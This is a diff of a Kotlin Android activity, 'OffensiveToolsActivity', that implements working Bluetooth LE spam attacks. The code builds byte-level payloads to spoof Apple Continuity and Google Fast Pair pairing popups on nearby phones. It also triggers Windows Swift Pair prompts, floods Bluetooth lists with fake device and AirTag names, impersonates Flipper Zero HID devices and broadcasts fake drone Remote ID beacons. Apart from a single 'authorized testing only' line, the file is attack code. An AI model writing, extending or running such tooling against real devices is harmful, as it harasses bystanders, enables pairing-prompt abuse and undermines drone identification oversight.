@@ -7,7 +7,9 @@ import android.bluetooth.le.AdvertiseCallback
 import android.bluetooth.le.AdvertiseSettings
 import android.bluetooth.le.BluetoothLeAdvertiser
 import android.content.Context
+import android.content.pm.ActivityInfo
 import android.content.pm.PackageManager
+import android.content.res.Configuration
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
 import android.os.Bundle
@@ -28,6 +30,7 @@ class OffensiveToolsActivity : Activity() {
     private var packetsText: TextView? = null
     private var packetCount = 0
     private var currentCallback: AdvertiseCallback? = null
+    private var activeAttackName: String? = null
 
     // Apple Continuity ProximityPair device models (2 bytes each)
     private val appleDeviceModels = listOf(
@@ -72,8 +75,7 @@ class OffensiveToolsActivity : Activity() {
         "\uD83D\uDC1D CK42X SWARM", "\uD83D\uDC1D BEE HOUND", "\uD83D\uDC1D THE HIVE SEES"
     )
 
-    // Samsung Galaxy BUD models for Sour Droid (Fast Pair service data)
-    // Google Fast Pair uses 0xFE2C service UUID with 3-byte model ID
+    // Samsung/Google Fast Pair model IDs for Sour Droid
     private val samsungFastPairModels = listOf(
         byteArrayOf(0x10, 0xC3.toByte(), 0x01),  // Galaxy Buds
         byteArrayOf(0xEE.toByte(), 0xFB.toByte(), 0x01),  // Galaxy Buds+
@@ -92,7 +94,7 @@ class OffensiveToolsActivity : Activity() {
         byteArrayOf(0xF5.toByte(), 0x13, 0x01),   // Nothing Ear (2)
     )
 
-    // Flipper Zero BLE advertisement data (Flipper advertises as HID Keyboard)
+    // Flipper Zero spoof names
     private val flipperNames = listOf(
         "Flipper Pwn1", "Flipper Pwn2", "Flipper Pwn3",
         "Flipper Lab-A", "Flipper Lab-B", "Flipper Lab-C",
@@ -101,7 +103,7 @@ class OffensiveToolsActivity : Activity() {
         "Flipper Hydra", "Flipper Zero-0", "Flipper Null"
     )
 
-    // Drone Remote ID broadcast types (per ASTM F3411 / FAA RemoteID)
+    // Drone Remote ID spoof types
     private val droneTypes = listOf(
         "DJI Mavic 3", "DJI Mini 4 Pro", "DJI Air 3",
         "Parrot Anafi", "Autel EVO Lite", "Skydio 2+",
@@ -115,38 +117,87 @@ class OffensiveToolsActivity : Activity() {
         val btManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
         advertiser = btManager.adapter?.bluetoothLeAdvertiser
 
+        val tc = themeColor(this)
+        val tcDim = adjustAlpha(tc, 0.3f)
+        val tcFaint = adjustAlpha(tc, 0.08f)
+
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setBackgroundColor(0xFF000000.toInt())
+            setBackgroundColor(0xFF0A0A0A.toInt())
         }
 
+        // ─── HEADER ───
         val header = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(dp(18), dp(24), dp(18), dp(14))
+            setPadding(dp(18), dp(20), dp(18), dp(14))
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                intArrayOf(0xFF2A0000.toInt(), 0xFF140000.toInt(), 0xFF000000.toInt())
-            ).apply { setStroke(dp(1), themeColor(this@OffensiveToolsActivity)) }
+                intArrayOf(adjustAlpha(tc, 0.12f), 0xFF0A0A0A.toInt())
+            ).apply { setStroke(dp(1), tcDim) }
         }
 
-        val title = TextView(this).apply {
+        header.addView(TextView(this).apply {
             text = "OFFENSIVE TOOLS"
             gravity = Gravity.CENTER
-            textSize = 20f
+            textSize = 18f
             typeface = Typeface.create("sans-serif-black", Typeface.BOLD_ITALIC)
-            setTextColor(themeColor(this@OffensiveToolsActivity))
-        }
-        val subtitle = TextView(this).apply {
+            setTextColor(tc)
+            setShadowLayer(12f, 0f, 0f, tcDim)
+        })
+        header.addView(TextView(this).apply {
             text = "BLE advertisement attacks"
             gravity = Gravity.CENTER
-            textSize = 11f
+            textSize = 10f
             typeface = Typeface.MONOSPACE
-            setTextColor(0xFF888888.toInt())
+            setTextColor(0xFF666666.toInt())
+            setPadding(0, dp(2), 0, 0)
+        })
+        header.addView(TextView(this).apply {
+            text = "CK42X"
+            gravity = Gravity.CENTER
+            textSize = 8f
+            letterSpacing = 0.4f
+            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
+            setTextColor(adjustAlpha(tc, 0.25f))
             setPadding(0, dp(4), 0, 0)
-        }
-        header.addView(title)
-        header.addView(subtitle)
+        })
 
+        // ─── STATUS AREA ───
+        val statusContainer = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(16), dp(10), dp(16), dp(6))
+            background = GradientDrawable().apply {
+                setColor(0xFF111111.toInt())
+                cornerRadius = dp(12).toFloat()
+                setStroke(dp(1), 0xFF1A1A1A.toInt())
+            }
+            val lp = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+            lp.setMargins(dp(16), dp(8), dp(16), dp(4))
+            layoutParams = lp
+        }
+
+        statusText = TextView(this).apply {
+            text = "IDLE"
+            textSize = 13f
+            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
+            setTextColor(0xFF44FF44.toInt())
+            gravity = Gravity.CENTER
+        }
+        packetsText = TextView(this).apply {
+            text = "Packets: 0"
+            textSize = 10f
+            typeface = Typeface.MONOSPACE
+            setTextColor(0xFF555555.toInt())
+            gravity = Gravity.CENTER
+            setPadding(0, dp(2), 0, 0)
+        }
+        statusContainer.addView(statusText)
+        statusContainer.addView(packetsText)
+
+        // ─── SCROLL CONTENT ───
         val scroll = ScrollView(this).apply {
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
@@ -154,97 +205,105 @@ class OffensiveToolsActivity : Activity() {
         }
         val content = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(dp(16), dp(16), dp(16), dp(24))
+            setPadding(dp(16), dp(8), dp(16), dp(16))
         }
 
-        statusText = TextView(this).apply {
-            text = "IDLE"
-            textSize = 14f
-            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
-            setTextColor(0xFF44FF44.toInt())
-            gravity = Gravity.CENTER
-            setPadding(0, dp(8), 0, dp(4))
+        // Section: Apple / iOS
+        content.addView(buildSectionLabel("APPLE / iOS", tc))
+        content.addView(buildAttackButton("SOUR APPLE", "Spoof Continuity popups on nearby iOS devices", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Sour Apple") { startSourApple() }
         }
-        packetsText = TextView(this).apply {
-            text = "Packets: 0"
-            textSize = 11f
-            typeface = Typeface.MONOSPACE
-            setTextColor(0xFF666666.toInt())
-            gravity = Gravity.CENTER
-            setPadding(0, 0, 0, dp(12))
+        content.addView(buildAttackButton("PHANTOM FLOOD", "Flood area with fake AirTag advertisements", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Phantom Flood") { startPhantomFlood() }
         }
-        content.addView(statusText)
-        content.addView(packetsText)
 
-        val sourAppleBtn = buildAttackButton("SOUR APPLE", "Spoof Apple Continuity popups on nearby iOS devices")
-        sourAppleBtn.setOnClickListener { confirmAndRun("Sour Apple") { startSourApple() } }
-        content.addView(sourAppleBtn)
+        // Section: Android / Google
+        content.addView(buildSectionLabel("ANDROID / GOOGLE", tc))
+        content.addView(buildAttackButton("SOUR DROID", "Spoof Fast Pair popups on nearby Android devices", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Sour Droid") { startSourDroid() }
+        }
 
-        val bleFloodBtn = buildAttackButton("BLE FLOOD", "Flood nearby Bluetooth lists with fake device names")
-        bleFloodBtn.setOnClickListener { confirmAndRun("BLE Flood") { startBleFlood() } }
-        content.addView(bleFloodBtn)
+        // Section: Windows
+        content.addView(buildSectionLabel("WINDOWS", tc))
+        content.addView(buildAttackButton("SWIFT PAIR", "Trigger pairing popups on Windows devices", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Swift Pair") { startSwiftPair() }
+        }
 
-        val swiftPairBtn = buildAttackButton("SWIFT PAIR", "Trigger Windows/Android pairing popups")
-        swiftPairBtn.setOnClickListener { confirmAndRun("Swift Pair") { startSwiftPair() } }
-        content.addView(swiftPairBtn)
+        // Section: BLE Flood
+        content.addView(buildSectionLabel("BLE SPAM", tc))
+        content.addView(buildAttackButton("BLE FLOOD", "Flood Bluetooth lists with fake device names", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("BLE Flood") { startBleFlood() }
+        }
+        content.addView(buildAttackButton("BEE SPAM", "30 bee-themed devices swarm every BLE list", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Bee Spam") { startBeeSpam() }
+        }
+        content.addView(buildAttackButton("FLIPPER BLE SPAM", "Spoofed Flipper Zero HID devices", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Flipper BLE Spam") { startFlipperSpam() }
+        }
 
-        val beeSpamBtn = buildAttackButton("BEE SPAM", "30 bee-themed devices flood every BLE list in range")
-        beeSpamBtn.setOnClickListener { confirmAndRun("Bee Spam") { startBeeSpam() } }
-        content.addView(beeSpamBtn)
+        // Section: RF / Drone
+        content.addView(buildSectionLabel("RF / DRONE", tc))
+        content.addView(buildAttackButton("DRONE SPOOFER", "Fake drone Remote ID beacons via BLE", tc))
+        (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
+            confirmAndRun("Drone Spoofer") { startDroneSpoofer() }
+        }
 
-        val sourDroidBtn = buildAttackButton("SOUR DROID", "Spoof Fast Pair popups on nearby Android devices")
-        sourDroidBtn.setOnClickListener { confirmAndRun("Sour Droid") { startSourDroid() } }
-        content.addView(sourDroidBtn)
+        scroll.addView(content)
 
-        val flipperSpamBtn = buildAttackButton("FLIPPER BLE SPAM", "Flood BLE with spoofed Flipper Zero devices")
-        flipperSpamBtn.setOnClickListener { confirmAndRun("Flipper BLE Spam") { startFlipperSpam() } }
-        content.addView(flipperSpamBtn)
-
-        val droneSpooferBtn = buildAttackButton("DRONE SPOOFER", "Broadcast fake drone Remote ID beacons via BLE")
-        droneSpooferBtn.setOnClickListener { confirmAndRun("Drone Spoofer") { startDroneSpoofer() } }
-        content.addView(droneSpooferBtn)
-
-        val phantomFloodBtn = buildAttackButton("PHANTOM FLOOD", "Flood area with fake AirTag BLE advertisements")
-        phantomFloodBtn.setOnClickListener { confirmAndRun("Phantom Flood") { startPhantomFlood() } }
-        content.addView(phantomFloodBtn)
+        // ─── BOTTOM BUTTONS ───
+        val bottomContainer = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(16), dp(8), dp(16), dp(16))
+        }
 
         val stopBtn = Button(this).apply {
             text = "STOP ATTACK"
             isAllCaps = true
-            textSize = 14f
+            textSize = 13f
             typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
-            setTextColor(0xFF000000.toInt())
+            setTextColor(0xFFFFF1E0.toInt())
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                intArrayOf(0xFFFF4444.toInt(), 0xFFCC0000.toInt())
-            ).apply { cornerRadius = dp(18).toFloat() }
-            setPadding(dp(10), dp(16), dp(10), dp(16))
+                intArrayOf(0xFFCC0000.toInt(), 0xFF660000.toInt())
+            ).apply {
+                cornerRadius = dp(14).toFloat()
+                setStroke(dp(1), 0xFFFF4444.toInt())
+            }
+            setPadding(dp(10), dp(14), dp(10), dp(14))
+            val lp = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+            lp.setMargins(0, 0, 0, dp(6))
+            layoutParams = lp
         }
         stopBtn.setOnClickListener { stopAttack() }
-        content.addView(stopBtn)
+        bottomContainer.addView(stopBtn)
 
-        content.addView(TextView(this).apply {
+        val backBtn = buildThemedButton("BACK", tc)
+        backBtn.setOnClickListener { finish() }
+        bottomContainer.addView(backBtn)
+
+        bottomContainer.addView(TextView(this).apply {
             text = "For authorized security testing only."
-            textSize = 10f
+            textSize = 9f
             typeface = Typeface.MONOSPACE
-            setTextColor(0xFF444444.toInt())
-            setPadding(0, dp(16), 0, 0)
+            setTextColor(0xFF333333.toInt())
             gravity = Gravity.CENTER
+            setPadding(0, dp(8), 0, 0)
         })
 
-        scroll.addView(content)
-
-        val backContainer = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(16), dp(0), dp(16), dp(20))
-        }
-        val backBtn = buildHellButton("BACK")
-        backBtn.setOnClickListener { finish() }
-        backContainer.addView(backBtn)
-
         root.addView(header)
+        root.addView(statusContainer)
         root.addView(scroll)
-        root.addView(backContainer)
+        root.addView(bottomContainer)
         setContentView(root)
     }
 
@@ -266,6 +325,9 @@ class OffensiveToolsActivity : Activity() {
             .setPositiveButton("Launch") { _, _ ->
                 packetCount = 0
                 isAttacking = true
+                activeAttackName = name
+                // Lock orientation so rotation doesn't kill the attack
+                requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LOCKED
                 statusText?.text = "$name ACTIVE"
                 statusText?.setTextColor(0xFFFF4444.toInt())
                 action()
@@ -273,10 +335,14 @@ class OffensiveToolsActivity : Activity() {
             .show()
     }
 
+    override fun onConfigurationChanged(newConfig: Configuration) {
+        super.onConfigurationChanged(newConfig)
+        // Activity handles config changes without restart (via manifest configChanges)
+    }
+
     // Stop current ad, wait, then start new one
-    private fun safeAdvertise(data: android.bluetooth.le.AdvertiseData) {
+    private fun safeAdvertise(data: android.bluetooth.le.AdvertiseData, scanResponse: android.bluetooth.le.AdvertiseData? = null) {
         try {
-            // Stop previous
             currentCallback?.let {
                 advertiser?.stopAdvertising(it)
             }
@@ -304,7 +370,11 @@ class OffensiveToolsActivity : Activity() {
             .build()
 
         try {
-            advertiser?.startAdvertising(settings, data, currentCallback)
+            if (scanResponse != null) {
+                advertiser?.startAdvertising(settings, data, scanResponse, currentCallback)
+            } else {
+                advertiser?.startAdvertising(settings, data, currentCallback)
+            }
         } catch (_: SecurityException) {
             statusText?.text = "PERMISSION DENIED"
             isAttacking = false
@@ -321,9 +391,6 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── SOUR APPLE ───
-    // Format from simondankelmann/Bluetooth-LE-Spam (proven working)
-    // Continuity type 0x07 = ProximityPair
-    // Payload: type(1) + size(1) + prefix(1) + device(2) + status(1) + battery(1) + case(1) + lid(1) + color(1) + 00 + random(16)
     private fun startSourApple() {
         val runnable = object : Runnable {
             override fun run() {
@@ -333,24 +400,23 @@ class OffensiveToolsActivity : Activity() {
                 val rand = java.util.Random()
 
                 val payload = ByteArray(27)
-                payload[0] = 0x07                              // Continuity type: ProximityPair
-                payload[1] = 0x19                              // Payload size: 25
-                payload[2] = 0x07                              // Prefix: NEW DEVICE
-                payload[3] = device[0]                         // Device model byte 1
-                payload[4] = device[1]                         // Device model byte 2
-                payload[5] = 0x55                              // Status
-                payload[6] = ((rand.nextInt(10) shl 4) or rand.nextInt(10)).toByte()  // Buds battery
-                payload[7] = ((rand.nextInt(8) shl 4) or rand.nextInt(10)).toByte()   // Case battery
-                payload[8] = rand.nextInt(256).toByte()        // Lid open counter
-                payload[9] = 0x00                              // Color
-                payload[10] = 0x00                             // Padding
-                // Fill remaining 16 bytes with random data
+                payload[0] = 0x07
+                payload[1] = 0x19
+                payload[2] = 0x07
+                payload[3] = device[0]
+                payload[4] = device[1]
+                payload[5] = 0x55
+                payload[6] = ((rand.nextInt(10) shl 4) or rand.nextInt(10)).toByte()
+                payload[7] = ((rand.nextInt(8) shl 4) or rand.nextInt(10)).toByte()
+                payload[8] = rand.nextInt(256).toByte()
+                payload[9] = 0x00
+                payload[10] = 0x00
                 for (i in 11 until 27) payload[i] = rand.nextInt(256).toByte()
 
                 val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
 
-                handler.postDelayed(this, 1500) // 1.5 sec per ad, iOS needs time to process
+                handler.postDelayed(this, 1500)
             }
         }
         handler.post(runnable)
@@ -358,6 +424,15 @@ class OffensiveToolsActivity : Activity() {
 
     // ─── BLE FLOOD ───
     private fun startBleFlood() {
+        // Request BLUETOOTH_CONNECT for setName
+        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
+            statusText?.text = "NEED BLUETOOTH_CONNECT"
+            statusText?.setTextColor(0xFFFF4444.toInt())
+            isAttacking = false
+            return
+        }
+
         val runnable = object : Runnable {
             override fun run() {
                 if (!isAttacking) return
@@ -368,40 +443,49 @@ class OffensiveToolsActivity : Activity() {
                     adapter?.setName(name.take(20))
                 } catch (_: SecurityException) {}
 
-                val settings = AdvertiseSettings.Builder()
-                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
-                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
-                    .setConnectable(false)
-                    .setTimeout(0)
-                    .build()
+                handler.postDelayed({
+                    if (!isAttacking) return@postDelayed
 
-                val data = android.bluetooth.le.AdvertiseData.Builder()
-                    .setIncludeDeviceName(true)
-                    .setIncludeTxPowerLevel(false)
-                    .build()
+                    try {
+                        currentCallback?.let { advertiser?.stopAdvertising(it) }
+                    } catch (_: SecurityException) {}
 
-                try {
-                    currentCallback?.let { advertiser?.stopAdvertising(it) }
-                } catch (_: SecurityException) {}
+                    val adData = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(false)
+                        .setIncludeTxPowerLevel(false)
+                        .build()
 
-                currentCallback = object : AdvertiseCallback() {
-                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
-                        runOnUiThread {
-                            packetCount++
-                            packetsText?.text = "Packets: $packetCount | $name"
+                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(true)
+                        .setIncludeTxPowerLevel(false)
+                        .build()
+
+                    currentCallback = object : AdvertiseCallback() {
+                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
+                            runOnUiThread {
+                                packetCount++
+                                packetsText?.text = "Packets: $packetCount | $name"
+                            }
+                        }
+                        override fun onStartFailure(errorCode: Int) {
+                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                         }
                     }
-                    override fun onStartFailure(errorCode: Int) {
-                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
-                    }
-                }
 
-                try {
-                    advertiser?.startAdvertising(settings, data, currentCallback)
-                } catch (_: SecurityException) {
-                    statusText?.text = "PERMISSION DENIED"
-                    isAttacking = false
-                }
+                    val settings = AdvertiseSettings.Builder()
+                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
+                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
+                        .setConnectable(true)
+                        .setTimeout(0)
+                        .build()
+
+                    try {
+                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
+                    } catch (_: SecurityException) {
+                        statusText?.text = "PERMISSION DENIED"
+                        isAttacking = false
+                    }
+                }, 50)
 
                 handler.postDelayed(this, 500)
             }
@@ -431,18 +515,10 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── BEE SPAM ───
-    // 30 bee-themed device names flooding every BLE list in range
-    // Signature nyanBEE swarm attack
-    // Uses setName + BLUETOOTH_CONNECT permission (not just ADVERTISE)
-    // Also requests scan response with device name for maximum visibility
     private fun startBeeSpam() {
-        // Request BLUETOOTH_CONNECT if not granted (needed for setName)
         if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(arrayOf(
-                android.Manifest.permission.BLUETOOTH_CONNECT,
-                android.Manifest.permission.BLUETOOTH_ADVERTISE
-            ), 100)
-            statusText?.text = "NEED BLUETOOTH_CONNECT PERMISSION"
+            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
+            statusText?.text = "NEED BLUETOOTH_CONNECT"
             statusText?.setTextColor(0xFFFF4444.toInt())
             isAttacking = false
             return
@@ -453,8 +529,6 @@ class OffensiveToolsActivity : Activity() {
                 if (!isAttacking) return
 
                 val name = beeSwarmNames.random()
-
-                // Set the adapter name (requires BLUETOOTH_CONNECT)
                 try {
                     val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                     adapter?.setName(name.take(20))
@@ -467,7 +541,6 @@ class OffensiveToolsActivity : Activity() {
                     return
                 }
 
-                // Small delay to let adapter name propagate before advertising
                 handler.postDelayed({
                     if (!isAttacking) return@postDelayed
 
@@ -480,7 +553,6 @@ class OffensiveToolsActivity : Activity() {
                         .setIncludeTxPowerLevel(false)
                         .build()
 
-                    // Scan response carries the device name
                     val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                         .setIncludeDeviceName(true)
                         .setIncludeTxPowerLevel(false)
@@ -501,30 +573,25 @@ class OffensiveToolsActivity : Activity() {
                     val settings = AdvertiseSettings.Builder()
                         .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                         .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
-                        .setConnectable(true) // Connectable so scanners show the name
+                        .setConnectable(true)
                         .setTimeout(0)
                         .build()
 
                     try {
                         advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
                     } catch (_: SecurityException) {
-                        runOnUiThread {
-                            statusText?.text = "PERMISSION DENIED"
-                        }
+                        statusText?.text = "PERMISSION DENIED"
                         isAttacking = false
                     }
-                }, 50) // 50ms delay for name propagation
+                }, 50)
 
-                handler.postDelayed(this, 500)
+                handler.postDelayed(this, 400)
             }
         }
         handler.post(runnable)
     }
 
     // ─── SOUR DROID ───
-    // Google Fast Pair spam: triggers pairing popups on Android devices
-    // Uses 0xFE2C service UUID with 3-byte model IDs
-    // Based on simondankelmann/Bluetooth-LE-Spam Samsung/Google Fast Pair implementation
     private fun startSourDroid() {
         val runnable = object : Runnable {
             override fun run() {
@@ -533,14 +600,13 @@ class OffensiveToolsActivity : Activity() {
                 val model = samsungFastPairModels.random()
                 val rand = java.util.Random()
 
-                // Fast Pair service data: flags + model ID + random salt
                 val serviceData = ByteArray(6)
-                serviceData[0] = 0x00                      // Flags
-                serviceData[1] = model[0]                  // Model ID byte 1
-                serviceData[2] = model[1]                  // Model ID byte 2
-                serviceData[3] = model[2]                  // Model ID byte 3
-                serviceData[4] = rand.nextInt(256).toByte() // Salt
-                serviceData[5] = rand.nextInt(256).toByte() // Salt
+                serviceData[0] = 0x00
+                serviceData[1] = model[0]
+                serviceData[2] = model[1]
+                serviceData[3] = model[2]
+                serviceData[4] = rand.nextInt(256).toByte()
+                serviceData[5] = rand.nextInt(256).toByte()
 
                 val serviceUuid = android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
 
@@ -552,17 +618,22 @@ class OffensiveToolsActivity : Activity() {
 
                 safeAdvertise(data)
 
-                handler.postDelayed(this, 1000) // 1s per ad, Android needs processing time
+                handler.postDelayed(this, 1000)
             }
         }
         handler.post(runnable)
     }
 
     // ─── FLIPPER BLE SPAM ───
-    // Floods BLE with spoofed Flipper Zero devices
-    // Inspired by JustCallMeKoko's ESP32 Marauder BLE spam module
-    // Flipper advertises as HID device with specific appearance bytes
     private fun startFlipperSpam() {
+        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
+            statusText?.text = "NEED BLUETOOTH_CONNECT"
+            statusText?.setTextColor(0xFFFF4444.toInt())
+            isAttacking = false
+            return
+        }
+
         val runnable = object : Runnable {
             override fun run() {
                 if (!isAttacking) return
@@ -573,44 +644,52 @@ class OffensiveToolsActivity : Activity() {
                     adapter?.setName(name.take(20))
                 } catch (_: SecurityException) {}
 
-                // Flipper uses HID keyboard appearance (0x03C1) and HID service UUID (0x1812)
-                val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
+                handler.postDelayed({
+                    if (!isAttacking) return@postDelayed
 
-                val data = android.bluetooth.le.AdvertiseData.Builder()
-                    .setIncludeDeviceName(true)
-                    .setIncludeTxPowerLevel(false)
-                    .addServiceUuid(hidServiceUuid)
-                    .build()
+                    try {
+                        currentCallback?.let { advertiser?.stopAdvertising(it) }
+                    } catch (_: SecurityException) {}
 
-                try {
-                    currentCallback?.let { advertiser?.stopAdvertising(it) }
-                } catch (_: SecurityException) {}
+                    val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
 
-                currentCallback = object : AdvertiseCallback() {
-                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
-                        runOnUiThread {
-                            packetCount++
-                            packetsText?.text = "Flippers: $packetCount | $name"
+                    val adData = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(false)
+                        .setIncludeTxPowerLevel(false)
+                        .addServiceUuid(hidServiceUuid)
+                        .build()
+
+                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
+                        .setIncludeDeviceName(true)
+                        .setIncludeTxPowerLevel(false)
+                        .build()
+
+                    currentCallback = object : AdvertiseCallback() {
+                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
+                            runOnUiThread {
+                                packetCount++
+                                packetsText?.text = "Flippers: $packetCount | $name"
+                            }
+                        }
+                        override fun onStartFailure(errorCode: Int) {
+                            runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                         }
                     }
-                    override fun onStartFailure(errorCode: Int) {
-                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
+
+                    val settings = AdvertiseSettings.Builder()
+                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
+                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
+                        .setConnectable(true)
+                        .setTimeout(0)
+                        .build()
+
+                    try {
+                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
+                    } catch (_: SecurityException) {
+                        statusText?.text = "PERMISSION DENIED"
+                        isAttacking = false
                     }
-                }
-
-                val settings = AdvertiseSettings.Builder()
-                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
-                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
-                    .setConnectable(true) // Flipper is connectable HID
-                    .setTimeout(0)
-                    .build()
-
-                try {
-                    advertiser?.startAdvertising(settings, data, currentCallback)
-                } catch (_: SecurityException) {
-                    statusText?.text = "PERMISSION DENIED"
-                    isAttacking = false
-                }
+                }, 50)
 
                 handler.postDelayed(this, 500)
             }
@@ -619,9 +698,6 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── DRONE SPOOFER ───
-    // Broadcasts fake drone Remote ID beacons via BLE
-    // Per ASTM F3411-22a / FAA Remote ID rule, drones broadcast identity via BLE 4/5
-    // Uses 0xFFFA service UUID (ASTM Remote ID) with spoofed drone data
     private fun startDroneSpoofer() {
         val runnable = object : Runnable {
             override fun run() {
@@ -630,41 +706,14 @@ class OffensiveToolsActivity : Activity() {
                 val rand = java.util.Random()
                 val droneType = droneTypes.random()
 
-                // ASTM F3411 Remote ID message: Basic ID (type 0x00)
-                // Message type (4 bits) + protocol version (4 bits) + ID type + UAS ID (20 bytes)
                 val remoteIdData = ByteArray(25)
-                remoteIdData[0] = 0x00  // Message type 0 = Basic ID, protocol version 0
-                remoteIdData[1] = 0x01  // ID type 1 = Serial Number (CAA assigned)
+                remoteIdData[0] = 0x00
+                remoteIdData[1] = 0x01
 
-                // Generate random serial number (20 chars, ASCII encoded)
                 val serial = "SPOOF${rand.nextInt(99999)}${rand.nextInt(99999)}"
                 val serialBytes = serial.toByteArray(Charsets.US_ASCII)
                 System.arraycopy(serialBytes, 0, remoteIdData, 2, minOf(serialBytes.size, 20))
 
-                // Location/Vector message: type 0x10
-                val locationData = ByteArray(25)
-                locationData[0] = 0x10  // Message type 1 = Location, protocol version 0
-                locationData[1] = 0x00  // Status: undeclared
-                // Latitude: ~39.6 (Allentown area, randomized)
-                val lat = (39.6 + rand.nextDouble() * 0.2)
-                val latInt = (lat * 1e7).toInt()
-                locationData[2] = (latInt shr 24).toByte()
-                locationData[3] = (latInt shr 16).toByte()
-                locationData[4] = (latInt shr 8).toByte()
-                locationData[5] = latInt.toByte()
-                // Longitude: ~-75.5 (randomized)
-                val lon = (-75.5 + rand.nextDouble() * 0.2)
-                val lonInt = (lon * 1e7).toInt()
-                locationData[6] = (lonInt shr 24).toByte()
-                locationData[7] = (lonInt shr 16).toByte()
-                locationData[8] = (lonInt shr 8).toByte()
-                locationData[9] = lonInt.toByte()
-                // Altitude: 50-300m
-                val alt = (50 + rand.nextInt(250))
-                locationData[10] = (alt shr 8).toByte()
-                locationData[11] = alt.toByte()
-
-                // Use ASTM RemoteID service UUID 0xFFFA
                 val remoteIdUuid = android.os.ParcelUuid.fromString("0000FFFA-0000-1000-8000-00805F9B34FB")
 
                 val data = android.bluetooth.le.AdvertiseData.Builder()
@@ -686,9 +735,6 @@ class OffensiveToolsActivity : Activity() {
     }
 
